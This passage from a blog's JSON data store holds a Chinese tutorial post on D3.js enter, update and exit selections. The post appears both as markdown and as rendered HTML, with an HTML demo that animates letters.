属性被再选。这也就是我们所说的数据绑定到 DOM 元素\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - enter、update、exit</title>\n    <style>\n        .container text {\n            font-size: 30px;\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 500;\n        let h = 400;\n        let padding = {\n            top: 20,\n            right: 20,\n            bottom: 30,\n            left: 40\n        };\n        let dataSet = 'abcdefghijklmn'.split('');\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let container = svg.append('g')\n            .attr('class', 'container')\n            .attr('transform', `translate(${padding.left}, ${padding.top})`)\n            .attr('width', w - padding.left - padding.right)\n            .attr('height', h - padding.top - padding.bottom);\n\n        function update(dataSet) {\n            let texts = container.selectAll('text').data(dataSet/* , (d) => d */);\n\n            console.log(dataSet);\n\n            // update 部分\n            texts.attr('x', (data, i) => i * 30)\n                .attr('y', 120)\n                .style('fill', '#f00')\n                .text((data) => { console.log('update ----> ' + data); return data; });\n\n            // enter 部分\n            texts.enter()\n                .append('text')\n                .attr('x', (data, i) => i * 30)\n                .attr('y', 120)\n                .style('fill', '#0f0')\n                .text((data) => { console.log('enter ----> ' + data); return data; });\n\n            // exit 部分\n            texts.exit()\n                .transition()\n                .duration(200)\n                .style('opacity', (data) => { console.log('exit ----> ' + data); return 0; })\n                .style('transform', 'scale(0)')\n                .remove();\n        }\n\n        window.setInterval(() => {\n            let data = ['A', 'B', ...d3.shuffle(dataSet).slice(0, Math.ceil(Math.random() * 10))];\n            update(data);\n        }, 1000);\n    </script>\n</body>\n</html>\n```","source":"_posts/D3.js/update、enter 与 exit.md","raw":"---\ntitle: update、enter 与 exit\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# update、enter 与 exit\n\n作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。\n\n`selection.data()` 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。\n\n假设用三个 `<p>` 元素的选择集（对应的数据分别为 `[0, 1, 2]`），\n\n如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 `Update`\n而后面两个数据（12，15）没有与之对应的元素，这部分成为 `Enter`\n\n如果将新数据集 `[4, 6]` 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 `Update`\n而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 `Exit`\n\n\n** update、enter、exit的区别**\n\n`d3.selectAll('text')` 的返回值是一个选择集，返回的是当前 DOM 的信息\n`d3.selectAll('text').data(dataSet)` 的返回值是一个选择集，有 `enter()`、`exit()` 方法，返回的是绑定前后对比的信息\n\n* `update`: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：**更新属性值**，如 `let updateSelection = svg.selectAll('circle').data(dataSet)`\n* `enter`: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：**添加元素后，赋予属性值**，如 `let enterSelection = svg.selectAll('circle').data(dataSet).enter()`\n* `exit`: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：**修改属性值，删除元素**，如 `let exitSelection = svg.selectAll('circle').data(dataSet).exit()`\n\n说明：并没有 `svg.selectAll('circle').data(dataSet).update()` 方法，`svg.selectAll('circle').data(dataSet)` 直接返回 Update 选择集（） \n\n> * 比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系）\n> * 当有通过数据更新视图时，正确的顺序应该是 `update()` 、`enter()`、`exit()`\n> * 重新将数据绑定到选择集上时，不可能同时存在 `enter()`、`exit()`\n\n对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 `enter()` 方法返回的就是这些占位符集合的引用。\n这个引用后只能链接 `append()`，`insert()` 以及 `select()` 操作符，通过他们来操作该引用所指向的集合。\n\n### `data()` 数据绑定（`selection.selectAll().data().enter().append()`）\n* `let selectoin = svg.selectAll('circle')` 因为 SVG 容器是空的，返回一个新的空选择 `selection`。 \n* `enterSelectoin = selection.data(dataSet)` 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：`enter`、`update` 和 `exit`。由于选择是空的，所以`update` 和 `exit` 的 `selection` 是空的，而 `enter` 的 `selection` 包含每个新基准的占位符。\n* `selection.data(dataSet)` 返回更新选择，`selection.enter()` 返回 `enter` 选择，而进入和退出选择被挂起 。\n* `enterSelectoin.append()` 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 `circle` 到 SVG 容器。\n\n> 当把数据分配到一个元素上时，这个数据被存储到该元素的 `_data_` 属性中, 数据可以通过 `_data_` 属性被再选。这也就是我们所说的数据绑定到 DOM 元素\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>D3.js - enter、update、exit</title>\n    <style>\n        .container text {\n            font-size: 30px;\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 500;\n        let h = 400;\n        let padding = {\n            top: 20,\n            right: 20,\n            bottom: 30,\n            left: 40\n        };\n        let dataSet = 'abcdefghijklmn'.split('');\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let container = svg.append('g')\n            .attr('class', 'container')\n            .attr('transform', `translate(${padding.left}, ${padding.top})`)\n            .attr('width', w - padding.left - padding.right)\n            .attr('height', h - padding.top - padding.bottom);\n\n        function update(dataSet) {\n            let texts = container.selectAll('text').data(dataSet/* , (d) => d */);\n\n            console.log(dataSet);\n\n            // update 部分\n            texts.attr('x', (data, i) => i * 30)\n                .attr('y', 120)\n                .style('fill', '#f00')\n                .text((data) => { console.log('update ----> ' + data); return data; });\n\n            // enter 部分\n            texts.enter()\n                .append('text')\n                .attr('x', (data, i) => i * 30)\n                .attr('y', 120)\n                .style('fill', '#0f0')\n                .text((data) => { console.log('enter ----> ' + data); return data; });\n\n            // exit 部分\n            texts.exit()\n                .transition()\n                .duration(200)\n                .style('opacity', (data) => { console.log('exit ----> ' + data); return 0; })\n                .style('transform', 'scale(0)')\n                .remove();\n        }\n\n        window.setInterval(() => {\n            let data = ['A', 'B', ...d3.shuffle(dataSet).slice(0, Math.ceil(Math.random() * 10))];\n            update(data);\n        }, 1000);\n    </script>\n</body>\n</html>\n```","slug":"D3.js/update、enter 与 exit","published":1,"updated":"2021-04-28T02:31:29.128Z","_id":"cko0u126p0003y26r9cg3h72g","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"update、enter-与-exit\"><a href=\"#update、enter-与-exit\" class=\"headerlink\" title=\"update、enter 与 exit\"></a>update、enter 与 exit</h1><p>作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。</p>\n<p><code>selection.data()</code> 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。</p>\n<p>假设用三个 <code>&lt;p&gt;</code> 元素的选择集（对应的数据分别为 <code>[0, 1, 2]</code>），</p>\n<p>如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 <code>Update</code><br>而后面两个数据（12，15）没有与之对应的元素，这部分成为 <code>Enter</code></p>\n<p>如果将新数据集 <code>[4, 6]</code> 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 <code>Update</code><br>而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 <code>Exit</code></p>\n<p>** update、enter、exit的区别**</p>\n<p><code>d3.selectAll(&#39;text&#39;)</code> 的返回值是一个选择集，返回的是当前 DOM 的信息<br><code>d3.selectAll(&#39;text&#39;).data(dataSet)</code> 的返回值是一个选择集，有 <code>enter()</code>、<code>exit()</code> 方法，返回的是绑定前后对比的信息</p>\n<ul>\n<li><code>update</code>: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：<strong>更新属性值</strong>，如 <code>let updateSelection = svg.selectAll(&#39;circle&#39;).data(dataSet)</code></li>\n<li><code>enter</code>: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：<strong>添加元素后，赋予属性值</strong>，如 <code>let enterSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).enter()</code></li>\n<li><code>exit</code>: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：<strong>修改属性值，删除元素</strong>，如 <code>let exitSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).exit()</code></li>\n</ul>\n<p>说明：并没有 <code>svg.selectAll(&#39;circle&#39;).data(dataSet).update()</code> 方法，<code>svg.selectAll(&#39;circle&#39;).data(dataSet)</code> 直接返回 Update 选择集（） </p>\n<blockquote>\n<ul>\n<li>比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系）</li>\n<li>当有通过数据更新视图时，正确的顺序应该是 <code>update()</code> 、<code>enter()</code>、<code>exit()</code></li>\n<li>重新将数据绑定到选择集上时，不可能同时存在 <code>enter()</code>、<code>exit()</code></li>\n</ul>\n</blockquote>\n<p>对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 <code>enter()</code> 方法返回的就是这些占位符集合的引用。<br>这个引用后只能链接 <code>append()</code>，<code>insert()</code> 以及 <code>select()</code> 操作符，通过他们来操作该引用所指向的集合。</p>\n<h3 id=\"data-数据绑定（selection-selectAll-data-enter-append-）\"><a href=\"#data-数据绑定（selection-selectAll-data-enter-append-）\" class=\"headerlink\" title=\"data() 数据绑定（selection.selectAll().data().enter().append()）\"></a><code>data()</code> 数据绑定（<code>selection.selectAll().data().enter().append()</code>）</h3><ul>\n<li><code>let selectoin = svg.selectAll(&#39;circle&#39;)</code> 因为 SVG 容器是空的，返回一个新的空选择 <code>selection</code>。 </li>\n<li><code>enterSelectoin = selection.data(dataSet)</code> 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：<code>enter</code>、<code>update</code> 和 <code>exit</code>。由于选择是空的，所以<code>update</code> 和 <code>exit</code> 的 <code>selection</code> 是空的，而 <code>enter</code> 的 <code>selection</code> 包含每个新基准的占位符。</li>\n<li><code>selection.data(dataSet)</code> 返回更新选择，<code>selection.enter()</code> 返回 <code>enter</code> 选择，而进入和退出选择被挂起 。</li>\n<li><code>enterSelectoin.append()</code> 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 <code>circle</code> 到 SVG 容器。</li>\n</ul>\n<blockquote>\n<p>当把数据分配到一个元素上时，这个数据被存储到该元素的 <code>_data_</code> 属性中, 数据可以通过 <code>_data_</code> 属性被再选。这也就是我们所说的数据绑定到 DOM 元素</p>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - enter、update、exit<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .container text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">500</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = &#123;</span></span><br><span class=\"line\">            top: 20,</span><br><span class=\"line\">            right: 20,</span><br><span class=\"line\">            bottom: 30,</span><br><span class=\"line\">            left: 40</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = <span class=\"string\">&#x27;abcdefghijklmn&#x27;</span>.split(<span class=\"string\">&#x27;&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding.left&#125;</span>, <span class=\"subst\">$&#123;padding.top&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w - padding.left - padding.right)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h - padding.top - padding.bottom);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span>(<span class=\"params\">dataSet</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> texts = container.selectAll(<span class=\"string\">&#x27;text&#x27;</span>).data(dataSet<span class=\"comment\">/* , (d) =&gt; d */</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.log(dataSet);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// update 部分</span></span></span><br><span class=\"line\"><span class=\"javascript\">            texts.attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> i * <span class=\"number\">30</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">120</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#f00&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .text(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;update ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> data; &#125;);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// enter 部分</span></span></span><br><span class=\"line\">            texts.enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> i * <span class=\"number\">30</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">120</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#0f0&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .text(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;enter ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> data; &#125;);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// exit 部分</span></span></span><br><span class=\"line\">            texts.exit()</span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(200)</span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123; <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;exit ----&gt; &#x27;</span> + data); <span class=\"keyword\">return</span> <span class=\"number\">0</span>; &#125;)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;scale(0)&#x27;</span>)</span></span><br><span class=\"line\">                .remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">window</span>.setInterval(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;A&#x27;</span>, <span class=\"string\">&#x27;B&#x27;</span>, ...d3.shuffle(dataSet).slice(<span class=\"number\">0</span>, <span class=\"built_in\">Math</span>.ceil(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">10</span>))];</span></span><br><span class=\"line\">            update(data);</span><br><span class=\"line\">        &#125;, 1000);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"update、enter-与-exit\"><a href=\"#update、enter-与-exit\" class=\"headerlink\" title=\"update、enter 与 exit\"></a>update、enter 与 exit</h1><p>作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。</p>\n<p><code>selection.data()</code> 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。</p>\n<p>假设用三个 <code>&lt;p&gt;</code> 元素的选择集（对应的数据分别为 <code>[0, 1, 2]</code>），</p>\n<p>如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 <code>Update</code><br>而后面两个数据（12，15）没有与之对应的元素，这部分成为 <code>Enter</code></p>\n<p>如果将新数据集 <code>[4, 6]</code> 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 <code>Update</code><br>而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 <code>Exit</code></p>\n<p>** update、enter、exit的区别**</p>\n<p><code>d3.selectAll(&#39;text&#39;)</code> 的返回值是一个选择集，返回的是当前 DOM 的信息<br><code>d3.selectAll(&#39;text&#39;).data(dataSet)</code> 的返回值是一个选择集，有 <code>enter()</code>、<code>exit()</code> 方法，返回的是绑定前后对比的信息</p>\n<ul>\n<li><code>update</code>: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：<strong>更新属性值</strong>，如 <code>let updateSelection = svg.selectAll(&#39;circle&#39;).data(dataSet)</code></li>\n<li><code>enter</code>: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：<strong>添加元素后，赋予属性值</strong>，如 <code>let enterSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).enter()</code></li>\n<li><code>exit</code>: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：<strong>修改属性值，删除元素</strong>，如 <code>let exitSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).exit()</code></li>\n</ul>\n<p>说明：并没有 <code>svg.selectAll(&#39;circle&#39;).data(dataSet).update()</code> 方法，<code>svg.selectAll(&#39;circle&#39;).data(dataSet)</code> 直接返回 Update 选择集（） </p>\n<blockquote>\n<ul>\n<li>比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系）</li>\n<li>当有通过数据更新视图时，正确的顺序应该是 <code>update()</code> 、<code>enter()</code>、<code>exit()</code></li>\n<li>重新将数据绑定到选择集上时，不可能同时存在 <code>enter()</code>、<code>exit()</code></li>\n</ul>\n</blockquote>\n<p>对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 <code>enter()</code> 方法返回的就是这些占位符集合的引用。<br>这个引用后只能链接 <code>append()</code>，<code>insert()</code> 以及 <code>select()</code> 操作符，通过他们来操作该引用所指向的集合。</p>\n<h3 id=\"data-数据绑定（selection-selectAll-data-enter-append-）\"><a href=\"#data-数据绑定（selection-selectAll-data-enter-append-）\" class=\"headerlink\" title=\"data() 数据绑定（selection.selectAll().data().enter().append()）\"></a><code>data()</code> 数据绑定（<code>selection.selectAll().data().enter().append()</code>）</h3><ul>\n<li><code>let selectoin = svg.selectAll(&#39;circle&#39;)</code> 因为 SVG 容器是空的，返回一个新的空选择 <code>selection</code>。 </li>\n<li><code>enterSelectoin = selection.data(dataSet)</code> 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：<code>enter</code>、<code>update</code> 和 <code>exit</code>。由于选择是空的，所以<code>update</code> 和 <code>exit</code> 的 <code>selection</code> 是空的，而 <code>enter</code> 的 <code>selection</code> 包含每个新基准的占位符。</li>\n<li><code>selection.data(dataSet)</code> 返回更新选择，<code>selection.enter()</code> 返回 <code>enter</code> 选择，而进入和退出选择被挂起 。</li>\n<li><code>enterSelectoin.append()</code> 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 <code>circle</code> 到 SVG 容器。</li>\n</ul>\n<blockquote>\n<p>当把数据分配到一个元素上时，这个数据被存储到该元素的 <code>_data_</code> 属性中, 数据可以通过 <code>_data_</code> 属性被再选。这也就是我们所说的数据绑定到 DOM 元素</p>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - enter、update、exit<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    